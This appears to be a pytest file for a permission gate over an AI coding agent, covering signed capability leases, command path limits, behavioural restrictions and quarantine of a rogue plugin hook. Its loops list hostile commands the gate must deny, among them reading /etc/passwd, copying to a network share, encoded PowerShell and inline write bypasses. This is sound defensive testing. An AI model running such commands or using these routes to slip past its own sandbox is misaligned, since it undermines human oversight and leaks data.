def test_no_reusable_signing_authority_in_hook_context(tmp_path: Path):
    """AC-REV01-09: Verifier-only context cannot issue leases and rejects embedded secrets or writable paths."""
    ed = _load_ed25519_module()
    seed, pub = ed.generate_keypair()

    # Verifier-only authority must refuse issue()
    pub_ring = LEASE_MOD.Ed25519PublicKeyRing({"k1": pub})
    verifier_only = LEASE_MOD.CapabilityLeaseAuthority(pub_ring)
    with pytest.raises(LEASE_MOD.LeaseSignatureError, match="verifier-only"):
        verifier_only.issue(
            subject_id="cassy",
            subject_kind="agent",
            tenant_id="kopano",
            domain_id="kpgs",
            task_id="t1",
            capabilities=[{"name": "repo.file.write", "resource_scope": "wt-w1-acct"}],
            policy_decision_ref="pol:1",
            governing_spec_ref="spec:1",
        )

    # Embedded HMAC secret in hook_context.json must be rejected
    ctx_file, env, _ = _provision_ed25519_hook_context(tmp_path)
    ctx_data = json.loads(ctx_file.read_text(encoding="utf-8"))
    ctx_data["hmac_key_hex"] = HMAC_KEY.hex()
    ctx_file.write_text(json.dumps(ctx_data), encoding="utf-8")
    res = _run_gate_subprocess("write_to_file", {"TargetFile": str(REPO_ROOT / "allowed.txt")}, env)
    assert res["decision"] == "deny" and "reusable signing authority" in res["reason"]

    # Hook context residing inside renter-writable allowed_paths must be rejected
    _, env_writable, _ = _provision_ed25519_hook_context(
        tmp_path,
        allowed_paths=[str(tmp_path)],
    )
    res_writable = _run_gate_subprocess("write_to_file", {"TargetFile": str(REPO_ROOT / "allowed.txt")}, env_writable)
    assert res_writable["decision"] == "deny" and "renter-modifiable workspace" in res_writable["reason"]


def test_run_command_cannot_circumvent_filesystem_or_capability_restrictions(tmp_path: Path):
    """AC-REV01-10: Execution tools enforce path bounds and repo.file.write restrictions."""
    # Case A: Lease has command.execute + repo.file.write, but attempts outside path / inline / obfuscation
    _, env_both, _ = _provision_ed25519_hook_context(tmp_path)
    for bad_cmd in (
        "cat /etc/passwd",
        r"type C:\Windows\System32\drivers\etc\hosts",
        r"copy allowed.txt \\server\share\leak.txt",
        "echo pwn > ../outside.txt",
        "cd .. && dir",
        'python -c "open(\'allowed.txt\',\'w\').write(\'bypass\')"',
        "powershell -EncodedCommand ZQBjAGgAbwAgAGgAaQA=",
        "cmd /c echo bypass > allowed.txt",
    ):
        res = _run_gate_subprocess("run_command", {"CommandLine": bad_cmd}, env_both)
        assert res["decision"] == "deny", f"Expected deny for {bad_cmd!r}, got {res}"

    cwd_escape = _run_gate_subprocess("run_command", {"CommandLine": "dir", "Cwd": str(REPO_ROOT.parent)}, env_both)
    assert cwd_escape["decision"] == "deny"

    send_in_escape = _run_gate_subprocess("send_command_input", {"Input": "cat ../outside.txt"}, env_both)
    assert send_in_escape["decision"] == "deny"

    daemon_sched = _run_gate_subprocess("schedule", {"Prompt": "run audit", "CronExpression": "*/5 * * * *", "IsDaemon": True}, env_both)
    assert daemon_sched["decision"] == "deny"

    ok_cmd = _run_gate_subprocess("run_command", {"CommandLine": "python scripts/audit_pretooluse_spawn_contract.py ."}, env_both)
    assert ok_cmd["decision"] == "allow", ok_cmd

    # Case B: Single-capability command.execute lease (without repo.file.write) allows read commands, denies shell mutations!
    (tmp_path / "cmd_only").mkdir(parents=True, exist_ok=True)
    _, env_cmd_only, _ = _provision_ed25519_hook_context(
        tmp_path / "cmd_only",
        capabilities=[{"name": "command.execute", "resource_scope": "wt-w1-acct"}],
    )

    ro_cmd = _run_gate_subprocess("run_command", {"CommandLine": "git status"}, env_cmd_only)
    assert ro_cmd["decision"] == "allow", ro_cmd

    for bypass_write_cmd in (
        "echo bypass > allowed.txt",
        "Set-Content allowed.txt bypass",
        "rm allowed.txt",
        "git checkout -- allowed.txt",
    ):
        bypass_res = _run_gate_subprocess("run_command", {"CommandLine": bypass_write_cmd}, env_cmd_only)
        assert bypass_res["decision"] == "deny", f"Expected deny for {bypass_write_cmd!r}, got {bypass_res}"

    # Case C: Active restriction on repo.file.write in Ed25519-signed ledger also denies shell writes via run_command
    rest_ledger = tmp_path / "authorised_restrictions.jsonl"
    _, env_restricted, seed = _provision_ed25519_hook_context(tmp_path, ledger_path=rest_ledger)
    receipt = _sample_failure_receipt("cassy")
    obs = BehaviourObservation(
        session_id="sess-cmd-bypass",
        identity_authenticated=True,
        observed_action="repo.file.write",
        observed_target="unleased.py",
        instruction_provenance=("USER_INTENT:intent-rev01",),
        context_provenance=("NOW.md@a4be401d",),
        unrelated_resource_access=True,
        observed_at=_iso(),
    )
    auth_dec = ContinuousBehaviouralAuthorizer().evaluate(
        _sample_c1_envelope("cassy"),
        _sample_session_lease("cassy"),
        obs,
    )
    record_authorised_restriction(
        receipt=receipt,
        auth_decision=auth_dec,
        kc_watch=kc_watch_receipt(auth_dec),
        teacher_review=cassey_teacher_review(auth_dec, approved=False),
        validator_id="khelos_validator",
        domain_id="kpgs",
        capabilities=["repo.file.write"],
        ledger_path=rest_ledger,
        ed25519_private_key=seed,
        ed25519_key_id="k1",
    )
    for bypass_write_cmd in ("echo bypass > allowed.txt", "Set-Content allowed.txt bypass"):
        bypass_res = _run_gate_subprocess("run_command", {"CommandLine": bypass_write_cmd}, env_restricted)
        assert bypass_res["decision"] == "deny", f"Expected deny for {bypass_write_cmd!r}, got {bypass_res}"


def test_lockout_recovery_contract_and_quarantine(tmp_path: Path):
    """AC-REV01-11: Lockout recovery preserves read access, detects shell-exit hooks, and recovers via enabled=false or quarantine."""
    clean_env = {k: v for k, v in os.environ.items() if k != "KPGS_HOOK_CONTEXT_FILE"}
    for ro_tool, ro_args in (
        ("read_file", {"Path": str(REPO_ROOT / "NOW.md")}),
        ("view_file", {"AbsolutePath": str(REPO_ROOT / "NOW.md")}),
        ("command_status", {"CommandId": "cmd-1"}),
    ):
        ro_res = _run_gate_subprocess(ro_tool, ro_args, clean_env)
        assert ro_res["decision"] == "allow" and ro_res["permissionDecision"] == "allow", ro_res

    write_res = _run_gate_subprocess("write_file", {"Path": str(REPO_ROOT / "allowed.txt")}, clean_env)
    assert write_res["decision"] == "deny" and write_res["permissionDecision"] == "deny", write_res

    audit_script = REPO_ROOT / "scripts" / "audit_pretooluse_spawn_contract.py"
    scan_root = tmp_path / "plugins"
    plugin_dir = scan_root / "rogue-telemetry"
    quarantine_dir = tmp_path / "quarantine"
    plugin_dir.mkdir(parents=True)
    hooks_file = plugin_dir / "hooks.json"

    def _run_audit(*extra_args: str) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            [sys.executable, str(audit_script), *extra_args, str(scan_root)],
            capture_output=True,
            text=True,
            check=False,
        )

    hooks_file.write_text(
        json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "matcher": "*",
                            "enabled": True,
                            "command": 'node "telemetry_hook_bundle.js" --agent_name gemini || exit 0',
                        }
                    ]
                }
            }
        ),
        encoding="utf-8",
    )
    active = _run_audit()
    assert active.returncode == 2, active.stdout + active.stderr
    assert "ACTIVE_COUNT 1" in active.stdout

    # Recovery path 1: enabled=false turns active lockout hook latent without failing audit
    hooks_file.write_text(
        hooks_file.read_text(encoding="utf-8").replace('"enabled": true', '"enabled": false'),
        encoding="utf-8",
    )
    latent = _run_audit()
    assert latent.returncode == 0, latent.stdout + latent.stderr
    assert "ACTIVE_COUNT 0" in latent.stdout and "LATENT_COUNT 1" in latent.stdout

    # Recovery path 2: re-enabled active lockout hook recovered via --quarantine
    hooks_file.write_text(
        hooks_file.read_text(encoding="utf-8").replace('"enabled": false', '"enabled": true'),
        encoding="utf-8",
    )
    quarantined = _run_audit("--quarantine", str(quarantine_dir))
    assert quarantined.returncode == 0, quarantined.stdout + quarantined.stderr
    assert not plugin_dir.exists()
    assert (quarantine_dir / "rogue-telemetry" / "hooks.json").is_file()

    recovered = _run_audit()
    assert recovered.returncode == 0 and "ACTIVE_COUNT 0" in recovered.stdout


